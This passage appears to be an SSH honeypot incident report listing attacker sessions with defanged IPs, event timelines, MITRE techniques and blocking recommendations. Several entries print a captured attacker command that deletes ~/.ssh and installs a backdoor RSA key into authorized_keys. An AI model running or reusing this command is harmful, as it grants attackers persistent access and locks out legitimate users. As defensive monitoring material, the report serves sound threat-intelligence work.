| `2026-06-29 16:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.189[.]16` to AbuseIPDB if not already reported
- [ ] Block `34.53.189[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d45db597ddbd

| Field | Detail |
|---|---|
| **Source IP** | `34.53.189[.]16` |
| **First Seen** | 2026-06-29 16:13 |
| **Last Seen** | 2026-06-29 16:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:13:06` | `cowrie.session.connect` |
| `2026-06-29 16:13:06` | `cowrie.login.success` |
| `2026-06-29 16:13:06` | `cowrie.session.params` |
| `2026-06-29 16:13:06` | `cowrie.command.input` |
| `2026-06-29 16:13:06` | `cowrie.command.failed` |
| `2026-06-29 16:13:07` | `cowrie.log.closed` |
| `2026-06-29 16:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.189[.]16` to AbuseIPDB if not already reported
- [ ] Block `34.53.189[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97be29c79480

| Field | Detail |
|---|---|
| **Source IP** | `34.53.189[.]16` |
| **First Seen** | 2026-06-29 16:13 |
| **Last Seen** | 2026-06-29 16:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:13:08` | `cowrie.session.connect` |
| `2026-06-29 16:13:08` | `cowrie.login.success` |
| `2026-06-29 16:13:08` | `cowrie.session.params` |
| `2026-06-29 16:13:08` | `cowrie.command.input` |
| `2026-06-29 16:13:24` | `cowrie.log.closed` |
| `2026-06-29 16:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.189[.]16` to AbuseIPDB if not already reported
- [ ] Block `34.53.189[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13759e6b1f8c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 16:14 |
| **Last Seen** | 2026-06-29 16:15 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:14:47` | `cowrie.session.connect` |
| `2026-06-29 16:14:49` | `cowrie.client.version` |
| `2026-06-29 16:14:49` | `cowrie.client.kex` |
| `2026-06-29 16:14:56` | `cowrie.login.success` |
| `2026-06-29 16:15:00` | `cowrie.session.params` |
| `2026-06-29 16:15:00` | `cowrie.command.input` |
| `2026-06-29 16:15:01` | `cowrie.log.closed` |
| `2026-06-29 16:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae00e45704f

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-06-29 16:17 |
| **Last Seen** | 2026-06-29 16:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:17:21` | `cowrie.session.connect` |
| `2026-06-29 16:17:21` | `cowrie.client.version` |
| `2026-06-29 16:17:21` | `cowrie.client.kex` |
| `2026-06-29 16:17:22` | `cowrie.login.success` |
| `2026-06-29 16:17:23` | `cowrie.session.params` |
| `2026-06-29 16:17:23` | `cowrie.command.input` |
| `2026-06-29 16:17:23` | `cowrie.command.failed` |
| `2026-06-29 16:17:24` | `cowrie.log.closed` |
| `2026-06-29 16:17:25` | `cowrie.session.params` |
| `2026-06-29 16:17:25` | `cowrie.command.input` |
| `2026-06-29 16:17:25` | `cowrie.session.file_download` |
| `2026-06-29 16:17:25` | `cowrie.log.closed` |
| `2026-06-29 16:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499a597b8f1e

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-06-29 16:17 |
| **Last Seen** | 2026-06-29 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:17:25` | `cowrie.session.connect` |
| `2026-06-29 16:17:25` | `cowrie.client.version` |
| `2026-06-29 16:17:25` | `cowrie.client.kex` |
| `2026-06-29 16:17:26` | `cowrie.login.success` |
| `2026-06-29 16:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f8a0c9c439

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-06-29 16:17 |
| **Last Seen** | 2026-06-29 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:17:27` | `cowrie.session.connect` |
| `2026-06-29 16:17:27` | `cowrie.client.version` |
| `2026-06-29 16:17:27` | `cowrie.client.kex` |
| `2026-06-29 16:17:28` | `cowrie.login.success` |
| `2026-06-29 16:17:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8feb020df7

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-06-29 16:18 |
| **Last Seen** | 2026-06-29 16:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:18:16` | `cowrie.session.connect` |
| `2026-06-29 16:18:16` | `cowrie.client.version` |
| `2026-06-29 16:18:17` | `cowrie.client.kex` |
| `2026-06-29 16:18:17` | `cowrie.login.success` |
| `2026-06-29 16:18:18` | `cowrie.session.params` |
| `2026-06-29 16:18:18` | `cowrie.command.input` |
| `2026-06-29 16:18:18` | `cowrie.command.failed` |
| `2026-06-29 16:18:19` | `cowrie.log.closed` |
| `2026-06-29 16:18:19` | `cowrie.session.params` |
| `2026-06-29 16:18:19` | `cowrie.command.input` |
| `2026-06-29 16:18:20` | `cowrie.session.file_download` |
| `2026-06-29 16:18:20` | `cowrie.log.closed` |
| `2026-06-29 16:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ac8d8616b5

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-06-29 16:18 |
| **Last Seen** | 2026-06-29 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:18:20` | `cowrie.session.connect` |
| `2026-06-29 16:18:20` | `cowrie.client.version` |
| `2026-06-29 16:18:20` | `cowrie.client.kex` |
| `2026-06-29 16:18:21` | `cowrie.login.success` |
| `2026-06-29 16:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb463e74eeb

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-06-29 16:18 |
| **Last Seen** | 2026-06-29 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:18:21` | `cowrie.session.connect` |
| `2026-06-29 16:18:21` | `cowrie.client.version` |
| `2026-06-29 16:18:21` | `cowrie.client.kex` |
| `2026-06-29 16:18:22` | `cowrie.login.success` |
| `2026-06-29 16:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44460314e9da

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-06-29 16:20 |
| **Last Seen** | 2026-06-29 16:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:20:16` | `cowrie.session.connect` |
| `2026-06-29 16:20:16` | `cowrie.client.version` |
| `2026-06-29 16:20:16` | `cowrie.client.kex` |
| `2026-06-29 16:20:16` | `cowrie.login.success` |
| `2026-06-29 16:20:17` | `cowrie.session.params` |
| `2026-06-29 16:20:17` | `cowrie.command.input` |
| `2026-06-29 16:20:17` | `cowrie.command.failed` |
| `2026-06-29 16:20:17` | `cowrie.log.closed` |
| `2026-06-29 16:20:18` | `cowrie.session.params` |
| `2026-06-29 16:20:18` | `cowrie.command.input` |
| `2026-06-29 16:20:18` | `cowrie.session.file_download` |
| `2026-06-29 16:20:18` | `cowrie.log.closed` |
| `2026-06-29 16:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6670eda8bb9a

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-06-29 16:20 |
| **Last Seen** | 2026-06-29 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:20:18` | `cowrie.session.connect` |
| `2026-06-29 16:20:18` | `cowrie.client.version` |
| `2026-06-29 16:20:18` | `cowrie.client.kex` |
| `2026-06-29 16:20:18` | `cowrie.login.success` |
| `2026-06-29 16:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56b2244ac0c

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-06-29 16:20 |
| **Last Seen** | 2026-06-29 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:20:19` | `cowrie.session.connect` |
| `2026-06-29 16:20:19` | `cowrie.client.version` |
| `2026-06-29 16:20:19` | `cowrie.client.kex` |
| `2026-06-29 16:20:19` | `cowrie.login.success` |
| `2026-06-29 16:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8867cfc46296

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-06-29 16:22 |
| **Last Seen** | 2026-06-29 16:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:22:57` | `cowrie.session.connect` |
| `2026-06-29 16:22:57` | `cowrie.client.version` |
| `2026-06-29 16:22:57` | `cowrie.client.kex` |
| `2026-06-29 16:22:58` | `cowrie.login.success` |
| `2026-06-29 16:22:59` | `cowrie.session.params` |
| `2026-06-29 16:22:59` | `cowrie.command.input` |
| `2026-06-29 16:22:59` | `cowrie.command.failed` |
| `2026-06-29 16:22:59` | `cowrie.log.closed` |
| `2026-06-29 16:23:00` | `cowrie.session.params` |
| `2026-06-29 16:23:00` | `cowrie.command.input` |
| `2026-06-29 16:23:00` | `cowrie.session.file_download` |
| `2026-06-29 16:23:00` | `cowrie.log.closed` |
| `2026-06-29 16:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9ae50afeb6

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-06-29 16:23 |
| **Last Seen** | 2026-06-29 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:23:01` | `cowrie.session.connect` |
| `2026-06-29 16:23:01` | `cowrie.client.version` |
| `2026-06-29 16:23:01` | `cowrie.client.kex` |
| `2026-06-29 16:23:02` | `cowrie.login.success` |
| `2026-06-29 16:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c0ee2643130

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-06-29 16:23 |
| **Last Seen** | 2026-06-29 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:23:02` | `cowrie.session.connect` |
| `2026-06-29 16:23:02` | `cowrie.client.version` |
| `2026-06-29 16:23:02` | `cowrie.client.kex` |
| `2026-06-29 16:23:03` | `cowrie.login.success` |
| `2026-06-29 16:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700b2ea737d2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 16:24 |
| **Last Seen** | 2026-06-29 16:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:24:02` | `cowrie.session.connect` |
| `2026-06-29 16:24:02` | `cowrie.client.version` |
| `2026-06-29 16:24:02` | `cowrie.client.kex` |
| `2026-06-29 16:24:04` | `cowrie.login.success` |
| `2026-06-29 16:24:05` | `cowrie.session.params` |
| `2026-06-29 16:24:05` | `cowrie.command.input` |
| `2026-06-29 16:24:06` | `cowrie.log.closed` |
| `2026-06-29 16:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01684995f8a

| Field | Detail |
|---|---|
| **Source IP** | `43.155.172[.]154` |
| **First Seen** | 2026-06-29 16:24 |
| **Last Seen** | 2026-06-29 16:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:24:36` | `cowrie.session.connect` |
| `2026-06-29 16:24:36` | `cowrie.client.version` |
| `2026-06-29 16:24:37` | `cowrie.client.kex` |
| `2026-06-29 16:24:38` | `cowrie.login.success` |
| `2026-06-29 16:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.172[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.155.172[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e0e419794f

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-06-29 16:24 |
| **Last Seen** | 2026-06-29 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:24:38` | `cowrie.session.connect` |
| `2026-06-29 16:24:38` | `cowrie.client.version` |
| `2026-06-29 16:24:38` | `cowrie.client.kex` |
| `2026-06-29 16:24:39` | `cowrie.login.success` |
| `2026-06-29 16:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405d841ed905

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 16:27 |
| **Last Seen** | 2026-06-29 16:28 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:27:48` | `cowrie.session.connect` |
| `2026-06-29 16:27:49` | `cowrie.client.version` |
| `2026-06-29 16:27:49` | `cowrie.client.kex` |
| `2026-06-29 16:27:55` | `cowrie.login.success` |
| `2026-06-29 16:27:59` | `cowrie.session.params` |
| `2026-06-29 16:27:59` | `cowrie.command.input` |
| `2026-06-29 16:28:00` | `cowrie.log.closed` |
| `2026-06-29 16:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-490ef32393fc

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 16:39 |
| **Last Seen** | 2026-06-29 16:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:39:01` | `cowrie.session.connect` |
| `2026-06-29 16:39:02` | `cowrie.client.version` |
| `2026-06-29 16:39:02` | `cowrie.client.kex` |
| `2026-06-29 16:39:04` | `cowrie.login.success` |
| `2026-06-29 16:39:05` | `cowrie.session.params` |
| `2026-06-29 16:39:05` | `cowrie.command.input` |
| `2026-06-29 16:39:05` | `cowrie.log.closed` |
| `2026-06-29 16:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2df2deb28117

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 16:40 |
| **Last Seen** | 2026-06-29 16:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:40:38` | `cowrie.session.connect` |
| `2026-06-29 16:40:39` | `cowrie.client.version` |
| `2026-06-29 16:40:39` | `cowrie.client.kex` |
| `2026-06-29 16:40:46` | `cowrie.login.success` |
| `2026-06-29 16:40:50` | `cowrie.session.params` |
| `2026-06-29 16:40:50` | `cowrie.command.input` |
| `2026-06-29 16:40:51` | `cowrie.log.closed` |
| `2026-06-29 16:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d48765b907be

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-29 16:52 |
| **Last Seen** | 2026-06-29 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:52:10` | `cowrie.session.connect` |
| `2026-06-29 16:52:10` | `cowrie.client.version` |
| `2026-06-29 16:52:10` | `cowrie.client.kex` |
| `2026-06-29 16:52:11` | `cowrie.login.success` |
| `2026-06-29 16:52:11` | `cowrie.session.params` |
| `2026-06-29 16:52:11` | `cowrie.command.input` |
| `2026-06-29 16:52:11` | `cowrie.log.closed` |
| `2026-06-29 16:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e1c393baeb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]239` |
| **First Seen** | 2026-06-29 16:52 |
| **Last Seen** | 2026-06-29 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:52:34` | `cowrie.session.connect` |
| `2026-06-29 16:52:34` | `cowrie.client.version` |
| `2026-06-29 16:52:34` | `cowrie.client.kex` |
| `2026-06-29 16:52:35` | `cowrie.login.success` |
| `2026-06-29 16:52:36` | `cowrie.session.params` |
| `2026-06-29 16:52:36` | `cowrie.command.input` |
| `2026-06-29 16:52:36` | `cowrie.log.closed` |
| `2026-06-29 16:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]239` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
